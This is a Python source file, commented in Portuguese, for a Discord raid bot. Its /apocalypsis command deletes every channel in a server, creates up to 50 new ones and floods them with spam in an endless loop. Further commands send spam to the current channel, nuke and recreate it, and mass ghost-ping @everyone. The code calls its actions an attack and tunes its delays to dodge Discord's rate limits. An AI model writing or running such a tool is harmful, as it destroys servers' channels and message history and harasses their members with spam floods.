import discord
from discord.ext import commands
import asyncio

# Configurações obrigatórias de intenção (Intents)
intents = discord.Intents.default()
intents.message_content = True 
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Controle global para parar os loops de ataque
ataque_ativo = False

# ==================== 1. O COMANDO MESTRE ATUALIZADO ====================

@bot.tree.command(name="apocalypsis", description="Apaga canais, cria novos e inicia spam contínuo em massa.")
@discord.app_commands.describe(
    nome_canais="Nome dos novos canais que serão criados",
    mensagem_spam="A mensagem personalizada que será floodada",
    quantos_canais="Quantidade de novos canais para criar (Máx 50)"
)
async def apocalypsis(interaction: discord.Interaction, nome_canais: str, mensagem_spam: str, quantos_canais: int):
    global ataque_ativo
    
    if ataque_ativo:
        await interaction.response.send_message("⚠️ Já existe um ataque em andamento! Use /stop primeiro.", ephemeral=True)
        return
        
    if quantos_canais > 50:
        await interaction.response.send_message("❌ Por segurança, limite o comando a no máximo 50 canais por vez.", ephemeral=True)
        return

    # Responder à interação imediatamente antes que o canal onde digitou suma
    await interaction.response.send_message("💀 **APOCALYPSIS INICIADO.** Iniciando purga e reconstrução do servidor...", ephemeral=True)
    
    ataque_ativo = True
    guild = interaction.guild

    # PASSO 1: Deletar todos os canais de texto e voz existentes
    print("🧹 Deletando canais antigos...")
    canais_para_deletar = [canal for canal in guild.channels]
    for canal in canais_para_deletar:
        try:
            await canal.delete(reason="Apocalypsis Executado")
            await asyncio.sleep(0.1) # Evita travamento por limite de requisições do Discord
        except discord.Forbidden:
            print(f"❌ Sem permissão para deletar o canal: {canal.name}")
        except Exception:
            pass

    # PASSO 2: Criar os novos canais personalizados
    print(f"🛠️ Criando {quantos_canais} novos canais...")
    novos_canais = []
    for i in range(quantos_canais):
        if not ataque_ativo:
            break
        try:
            novo_canal = await guild.create_text_channel(name=f"{nome_canais}-{i+1}", reason="Apocalypsis Reconstrução")
            novos_canais.append(novo_canal)
            await asyncio.sleep(0.2)
        except discord.Forbidden:
            print("❌ Erro fatal: O bot perdeu a permissão de Gerenciar Canais.")
            break

    # PASSO 3: Iniciar o spam contínuo nos canais recém-criados
    print("🔥 Iniciando flood contínuo de mensagens...")
    while ataque_ativo and novos_canais:
        tasks = []
        for canal in novos_canais:
            tasks.append(canal.send(mensagem_spam))
        
        if tasks:
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except Exception:
                pass
        
        # Delay de 0.7 segundos entre as rodadas de spam para proteger o IP do bot
        await asyncio.sleep(0.7)

# ==================== 2. OUTROS COMANDOS DE SPAM E CHAOS ====================

@bot.tree.command(name="raid", description="Envia um spam de mensagens personalizadas no canal atual.")
@discord.app_commands.describe(mensagem="A mensagem que será repetida", quantidade="Número de vezes")
async def raid(interaction: discord.Interaction, mensagem: str, quantidade: int):
    global ataque_ativo
    if len(mensagem) > 2000:
        await interaction.response.send_message("❌ Erro: Limite de 2000 caracteres excedido.", ephemeral=True)
        return
        
    ataque_ativo = True
    await interaction.response.send_message(f"🚨 Iniciando spam de {quantidade} mensagens...", ephemeral=True)
    
    canal_real = bot.get_channel(interaction.channel_id) or await bot.fetch_channel(interaction.channel_id)
    for _ in range(quantidade):
        if not ataque_ativo: 
            break
        try:
            await canal_real.send(mensagem)
            await asyncio.sleep(0.6)
        except discord.Forbidden:
            print("❌ Sem permissão de escrita.")
            break

@bot.tree.command(name="blank-chat", description="Envia 4 grandes blocos invisíveis para limpar visualmente o chat.")
async def blank_chat(interaction: discord.Interaction):
    await interaction.response.send_message("Limpando chat visualmente...", ephemeral=True)
    
    canal_real = bot.get_channel(interaction.channel_id) or await bot.fetch_channel(interaction.channel_id)
    mensagem_vazia = "_​" + "\n" * 195 + "_​"
    for _ in range(4):
        try:
            await canal_real.send(mensagem_vazia)
            await asyncio.sleep(0.3)
        except discord.Forbidden:
            break

@bot.tree.command(name="nuke-channel", description="Apaga o canal atual e recria um idêntico e limpo em segundos.")
async def nuke_channel(interaction: discord.Interaction):
    canal_atual = interaction.channel
    posicao = canal_atual.position
    categoria = canal_atual.category

    await interaction.response.send_message("💣 Detonando canal em 3 segundos...", ephemeral=True)
    await asyncio.sleep(3)

    try:
        novo_canal = await canal_atual.clone(reason="Nuke executado")
        await novo_canal.edit(position=posicao, category=categoria)
        await canal_atual.delete(reason="Nuke executado")
        await novo_canal.send("☢️ **Este canal sofreu um Nuke. Todo o histórico de mensagens foi limpo.**")
    except discord.Forbidden:
        print("❌ O bot precisa da permissão 'Gerenciar Canais' para executar o nuke.")

@bot.tree.command(name="mass-ghostping", description="Envia menções rápidas de @everyone que desaparecem na hora.")
@discord.app_commands.describe(quantidade="Quantos pings ocultos enviar")
async def mass_ghostping(interaction: discord.Interaction, quantidade: int):
    global ataque_ativo
    ataque_ativo = True
    await interaction.response.send_message(f"👻 Iniciando {quantidade} Ghost Pings...", ephemeral=True)
    
    canal_real = bot.get_channel(interaction.channel_id) or await bot.fetch_channel(interaction.channel_id)
    for _ in range(quantidade):
        if not ataque_ativo:
            break
        try:
            msg = await canal_real.send("@everyone")
            await msg.delete()
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            break

# ==================== 3. COMANDOS DE CONTROLE E INTERRUPÇÃO ====================

@bot.tree.command(name="stop", description="Interrompe imediatamente qualquer comando de spam/ataque ativo.")
async def stop(interaction: discord.Interaction):
    global ataque_ativo
    if not ataque_ativo:
        await interaction.response.send_message("Nenhum ataque ativo no momento.", ephemeral=True)
        return
    ataque_ativo = False
    await interaction.response.send_message("🛑 **CESSAR-FOGO.** Todos os loops foram interrompidos.", ephemeral=True)

@bot.tree.command(name="shutdown", description="Desliga o bot completamente.")
async def shutdown(interaction: discord.Interaction):
    global ataque_ativo
    ataque_ativo = False
    await interaction.response.send_message("🔌 Desligando...", ephemeral=True)
    await bot.close()

# ==================== CONEXÃO FINAL ====================

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"✅ {len(synced)} comandos sincronizados globalmente com sucesso!")
    except Exception as e:
        print(f"❌ Erro na sincronização automática: {e}")
    print(f"🤖 Bot online e pronto para testes como: {bot.user}")
bot.run("SEU_TOKEN_AQUI")
